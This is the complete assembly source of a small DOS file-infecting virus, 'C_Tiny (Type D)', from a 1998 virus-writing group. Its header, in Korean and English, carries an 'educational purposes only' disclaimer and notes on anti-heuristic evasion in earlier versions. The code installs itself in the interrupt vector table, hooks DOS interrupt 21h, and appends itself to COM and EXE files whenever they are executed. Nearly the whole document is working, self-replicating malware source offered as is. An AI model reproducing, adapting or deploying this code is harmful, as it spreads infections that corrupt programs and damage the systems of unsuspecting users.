;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;					     \\\\\\\  \       \   \\\\\\\
;	 C_Tiny    (Type D)		    \	       \     \	 \
;					    \		\   \	 \    98/05
;					    \		 \ \	 \
;					     \\\\\\\	  \	  \\\\\\\ #04
;
; Virus Name : C_Tiny (Type D)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date	     : 1998/05/02
; Type	     : Memory resident COM/EXE
;
;  !*< 법률적 의무 >********************************************************!
;   *									     *
;   * 경고 !								     *
;   *	     이 정보는 교육적인 목적으로만 사용되어야 합니다. 우리는 이      *
;   *	     정보를 사용해서 발생하는 어떤 문제에 대해서도 책임을 지지 않    *
;   *	     습니다. 모든 책임은 글을 읽는 사람에게 있습니다.		     *
;   *									     *
;   * Warning ! 							     *
;   *	     This information is for educational purposes only. We are	     *
;   *	     not responsible for any problems caused by the use of this      *
;   *	     information. Responsibility is entirely placed on the reader    *
;   *									     *
;   !************************************************************************!
;
; 간단한 램상주 바이러스로 인터럽트 벡터 주소표에 상주한다. (0020:0000)
; 인터럽트 벡터에 상주하므로 자칫 잘못하면 시스템에 치명적일 수 있다. 따라서
; 바이러스는 인터럽트 벡터 주소표의 내용이 0 인지 검사 한다. 0 이 아니라면 이
; 미 상주해 있거나 컴퓨터에서 사용하고 있다.
;
; D 형은 EXE 파일도 감염시킬 수 있다. 코드가 IVT 상주형 바이러스의 한계에 거의
; 육박해 있지만 300 바이트가 안되는 크기로 COM,EXE 파일 모두 감염 시킬 수 있다.
; 한국산 바이러스중 가장작은 크기의 COM/EXE 감염 바이러스일 것이다.
; 다른 부가 기능도 넣고 싶었지만 바이러스 크기 때문에 어쩔 수 없었고 가능한 최
; 적화를 하기 위해서 노력했다.
;
;  C_Tiny (Type A) : 최초 버전
;  C_Tiny (Type B) : 약간의 Anti-Heuristic 기법 사용
;  C_Tiny (Type C) : 시작점 구하는 방법이 바뀜 (Anti-Heuristic)
;  C_Tiny (Type D) : EXE 파일도 감염, 윈도우 파일 감염 제외
;
;  앞으로 Anti-Heuristic 을 사용하는 버전을 마지막으로 C_Tiny 는 끝낼까 한다.
;
;  Thanx : Dark Angel, TㄼN
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

	    .MODEL  TINY
	    .CODE
	    .286

            org   0h
 Mem_size   equ   offset End_Memory	; 메모리 크기
 Vir_size   equ   offset End_virus	; 실제 바이러스 크기
 EXE_ID     equ   'CT'                  ; EXE 파일 식별자

 C_Tiny:
            db    0E8h, 0, 0            ;
            pop   si                    ; 바이러스 시작점 구하기
            sub   si, 0003              ;
            push  ds
            xor   ax,ax                 ; 코드의 최적화를 위해서 앞부분을 바
            mov   es,ax                 ; 꾸었다.
            mov   di, 0200h             ;
	    mov   cx, Mem_size		; 바이러스 길이 만큼 비교
            push  di
 Check_IVT_Zero:
            repz  scasb                 ; 0000:0200 에서 바이러스크기만큼 빈공
            pop   di                    ; 간 인지 검사한다.
            jnz   ChkCOMorEXEFile       ; 빈공간이 아니면 상주 포기

 Copy_Vir_IVT:
            push  si                    ;
            mov   cx, Vir_size          ; 바이러스 길이
	    db	  2Eh			; CS:SI -> ES:DI
            repz  movsb                 ; 바이러스 시작위치 -> 0000:0200
            pop   si                    ; SI = 바이러스 시작점

            push  es                    ;
            pop   ds                    ; DS=0000
            mov   di, offset End_Virus + 200h ; 200h 은 IVT 주소값 (0:200h)
            mov   ax, offset NewInt21   ; 인터럽트 21h 오프셋
            xchg  ax, ds:[0084h]
            stosw                       ; 세그먼트 변경
            mov   ax, 20h               ; 바이러스 세그먼트는 (0020h)
                                        ; 오프셋이 00xxh 이기 때문에 AL 에 넣음
            xchg  ax, ds:[0086h]
            stosw                       ; AX=ES:DI
            pop   ds                    ; 첫부분에서 저장했던 DS
 chkCOMorEXEFile:
            add   si, offset OldHeader  ; SI = 시작점 + 원래헤더시작점
            mov   di,100h               ; COM 파일인지 검사
            cmp   word ptr DS:[DI],0E94Dh
            jnz   Return_EXE

 Restore_COM_Head:
	    push  cs
	    pop   es
	    push  di			; 이동할 주소 저장
	    movsw			; 4 바이트 복구
	    movsw			;
	    ret 			; CS:100h 로 이동

 Return_EXE:                            ; EXE 복구
            push  ds
            pop   es
            mov   ax,ds
            add   ax,10h
            add   word ptr cs:[si+2],ax ;
            jmp   dword ptr cs:[si]     ;

 OldHeader  dw    0h                    ; 원래 COM 앞부분
            dw    0FFF0h                ; 여기에 10h 을 더하면 0 이된다.
            db    'C_TinyD'             ; 바이러스 이름

 lseek:
	    mov   ah,42h		; 포인터
	    xor   cx,cx
	    cwd
	    int   21h
	    ret

 InfectEXE:
            push  ax                    ; file size
	    push  dx

            push  si
            mov   si, offset FileBuffer+14h
            movsw
            movsw

            add   ax, vir_size          ; 바이러스 길이 더하기
	    adc   dx,0

            mov   cx,200h               ; / 512
	    div   cx

            or    dx,dx                 ; 나머지가 존재하는가 ?
	    jz	  nohiccup
	    inc   ax
  nohiccup:
            pop   si
            mov   word ptr ds:[si+4],ax
            mov   word ptr ds:[si+2],dx

	    pop   dx
	    pop   ax

            mov   cx,10h                ;
	    div   cx

            sub   ax,ds:[si+8]

            mov   di, offset FileBuffer + 12h
            push  ax
            mov   ax, EXE_ID
            stosw                       ; EXE_ID [DI+12h]
            xchg  ax,dx
            stosw                       ; DI+14h -> IP
            pop   ax
            stosw                       ; DI+16h -> CS
	    jmp   Write_Virus

 NewInt21:
	    pusha			; 286 + 에서 지원
	    push  ds
	    push  es

	    xor   ah,4Bh		; 실행인가 ?
            jnz   Error

            mov   ax,  3D02h            ; 파일 열기
            int   21h
            jc    Error                 ; 열기 에러 ?
            xchg  ax,bx                 ; BX = 파일핸들

	    push  cs			; 세그먼트 통일
	    pop   ds
	    push  cs
	    pop   es

            mov   ah, 3Fh               ; 파일 읽기
            mov   cx, 18h               ; 바이트수
            mov   dx, offset FileBuffer ; 버퍼 주소
            int   21h

            mov   si, dx
            mov   di, offset OldHeader

            mov   al,2                  ; 파일 끝으로 이동
            call  lseek

            cmp   byte ptr [SI+18h], '@'; 윈도우 파일인가 ?
            jz    Close
            cmp   word ptr [SI+12h],EXE_ID   ; EXE 감염여부 검사
            jz    Close
            cmp   word ptr [SI], 0E94Dh ; 감염된 COM 파일
	    jz	  Close
            cmp   word ptr [SI], 'ZM'   ; EXE 파일인가 ?
	    jz	  InfectEXE

            push  si
            movsw                       ; COM 헤더부분 저장
            movsw
            pop   di                    ; FileBuffer

            push  ax
            mov   ax, 0E94Dh            ; 감염 식별자 + JMP
            stosw                       ; JMP -> FileBuffer
            pop   ax
            sub   ax,0004               ;
            stosw

 Write_Virus:
            mov   ah, 40h               ; 바이러스 쓰기
            mov   cx, offset Vir_size   ; 바이러스 길이
	    xor   dx,dx 		; 버퍼 오프셋
            int   21h

	    xor   al,al 		; 파일 처음으로 이동
            call  lseek

            mov   ah, 40h               ; 앞부분 쓰기
            mov   cx, 18h               ; 바이트 수
            mov   dx, offset FileBuffer ; 오프셋
            int   21h

 Close:
            mov   ah, 3Eh               ; 파일 닫기
            int   21h
 Error:
	    pop   es
	    pop   ds
	    popa
 Jmp_Org_Int21:
	    db	  0EAh			; --> 여기까지 파일에 저장
 End_Virus:
            dw    ?,?                   ; Old Int 21h
 FileBuffer db    18h dup (0)

 End_Memory:                            ; 메모리에서 바이러스 끝 위치
	    END   C_Tiny
